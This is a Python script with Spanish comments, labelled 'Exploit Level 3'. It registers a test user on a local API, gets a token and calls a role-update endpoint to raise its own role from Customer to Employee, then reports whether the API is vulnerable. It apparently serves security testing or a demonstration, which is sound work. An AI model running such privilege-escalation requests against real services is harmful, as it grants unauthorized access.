import time
import requests

BASE_URL = "http://localhost:8091"

# ============= CONFIGURACI√ìN DEL USUARIO DE PRUEBA =============
TEST_USER = {
    "username": "Mariaaa_video_3",
    "password": "test123456",
    "phone_number": "4554544448565",
    "first_name": "Level3",
    "last_name": "Test"
}

TARGET_ROLE = "Employee"  # Rol al que queremos escalar

# ============= FUNCIONES AUXILIARES =============
def slow_print(msg, delay=0.5):
    """Imprime mensaje con delay para visualizar el proceso"""
    print(msg)
    time.sleep(delay)

def separator(title=""):
    """Imprime separador visual"""
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

# ============= FUNCIONES DE API =============
def register_user(user_data):
    """Registra un nuevo usuario"""
    slow_print(f"üìù Registrando usuario: {user_data['username']}")
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        slow_print(f"‚úÖ Respuesta [{r.status_code}]: {r.text}")
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"‚úÖ Usuario '{user_data['username']}' creado exitosamente\n")
            return True
        else:
            slow_print(f"‚ö†Ô∏è  Posible error en registro\n")
            return False
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return False

def get_token(username, password):
    """Obtiene token de autenticaci√≥n"""
    slow_print(f"üîë Obteniendo token para: {username}")
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"‚úÖ Token obtenido: {token[:50]}...\n")
            return token
        else:
            slow_print(f"‚ùå Error [{r.status_code}]: {r.text}\n")
            return None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return None

def get_profile(token, username):
    """Consulta el perfil del usuario y muestra el rol"""
    slow_print(f"üë§ Consultando perfil de: {username}")
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.get(
            f"{BASE_URL}/profile",
            headers=headers
        )
        
        if r.status_code == 200:
            profile_data = r.json()
            slow_print(f"‚úÖ Perfil obtenido [{r.status_code}]:")
            slow_print(f"   {r.text}")
            
            # Extraer y mostrar rol si existe
            role = profile_data.get("role", "No especificado")
            slow_print(f"\nüé≠ ROL ACTUAL: {role}\n")
            return profile_data
        else:
            slow_print(f"‚ùå Error [{r.status_code}]: {r.text}\n")
            return None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return None

def update_role(token, target_username, new_role):
    """Intenta actualizar el rol de un usuario (Privilege Escalation)"""
    slow_print(f"‚ö†Ô∏è  INTENTANDO ESCALAR PRIVILEGIOS...")
    slow_print(f"üéØ Target: {target_username} | Nuevo rol: {new_role}")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "username": target_username,
        "role": new_role
    }
    
    try:
        r = requests.put(
            f"{BASE_URL}/users/update_role",
            json=payload,
            headers=headers
        )
        
        slow_print(f"\nüì° Respuesta del servidor [{r.status_code}]:")
        slow_print(f"   {r.text}")
        
        if r.status_code == 200:
            slow_print(f"\n‚úÖ ¬°√âXITO! Rol actualizado a: {new_role}\n")
            return True
        elif r.status_code == 403:
            slow_print(f"\nüõ°Ô∏è  Acceso denegado (API protegida correctamente)\n")
            return False
        else:
            slow_print(f"\n‚ö†Ô∏è  Respuesta inesperada\n")
            return False
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n")
        return False

# ============= SCRIPT PRINCIPAL - EXPLOIT LEVEL 3 =============
def main():
    separator("üö® EXPLOIT LEVEL 3 - PRIVILEGE ESCALATION (Ejecuci√≥n Lenta)")
    
    slow_print("üìã Descripci√≥n del ataque:")
    slow_print("   Un usuario regular intenta escalar sus privilegios")
    slow_print("   modificando su propio rol de 'Customer' a 'Employee'\n")
    
    # ===== PASO 1: CREAR USUARIO DE PRUEBA =====
    separator("PASO 1: Crear usuario de prueba")
    slow_print(f"üë§ Creando usuario: {TEST_USER['username']}")
    slow_print(f"   (Por defecto deber√≠a tener rol 'Customer')\n")
    
    success = register_user(TEST_USER)
    if not success:
        slow_print("‚ùå No se pudo crear el usuario. Abortando exploit.\n")
        return
    
    # ===== PASO 2: OBTENER TOKEN =====
    separator("PASO 2: Obtener token de autenticaci√≥n")
    
    token = get_token(TEST_USER["username"], TEST_USER["password"])
    if not token:
        slow_print("‚ùå No se pudo obtener el token. Abortando exploit.\n")
        return
    
    # ===== PASO 3: VER PERFIL INICIAL Y CONFIRMAR ROL =====
    separator("PASO 3: Verificar perfil y rol inicial")
    
    initial_profile = get_profile(token, TEST_USER["username"])
    if not initial_profile:
        slow_print("‚ùå No se pudo obtener el perfil. Continuando...\n")
    else:
        initial_role = initial_profile.get("role", "Desconocido")
        slow_print(f"üìä Estado inicial confirmado:")
        slow_print(f"   Usuario: {TEST_USER['username']}")
        slow_print(f"   Rol: {initial_role}\n")
    
    # ===== PASO 4: INTENTAR ESCALAR PRIVILEGIOS =====
    separator("PASO 4: Intentar escalada de privilegios")
    
    slow_print("üîì Ejecutando ataque de privilege escalation...")
    slow_print(f"   Intentando cambiar rol a: {TARGET_ROLE}\n")
    
    exploit_success = update_role(token, TEST_USER["username"], TARGET_ROLE)
    
    # ===== PASO 5: VERIFICAR SI EL ATAQUE FUNCION√ì =====
    separator("PASO 5: Verificar resultado del ataque")
    
    slow_print("üîç Consultando perfil nuevamente para confirmar cambios...\n")
    final_profile = get_profile(token, TEST_USER["username"])
    
    if final_profile:
        final_role = final_profile.get("role", "Desconocido")
        
        slow_print("\n" + "="*70)
        slow_print("üìä RESUMEN DEL EXPLOIT")
        slow_print("="*70)
        
        if initial_profile:
            slow_print(f"   Rol inicial:  {initial_profile.get('role', 'Desconocido')}")
        slow_print(f"   Rol objetivo: {TARGET_ROLE}")
        slow_print(f"   Rol final:    {final_role}")
        
        if exploit_success and final_role == TARGET_ROLE:
            slow_print("\nüö® ¬°VULNERABILIDAD CONFIRMADA!")
            slow_print(f"   El usuario '{TEST_USER['username']}' escal√≥ privilegios exitosamente")
            slow_print(f"   de 'Customer' a '{TARGET_ROLE}'")
        else:
            slow_print("\n‚úÖ API SEGURA")
            slow_print("   No se pudo escalar privilegios")
            slow_print("   El rol permanece sin cambios")
        
        print("="*70 + "\n")
    
    separator("‚úÖ FIN DEL EXPLOIT LEVEL 3")
    
    slow_print(f"üí° Token usado: {token[:50]}...\n")

if __name__ == "__main__":
    main()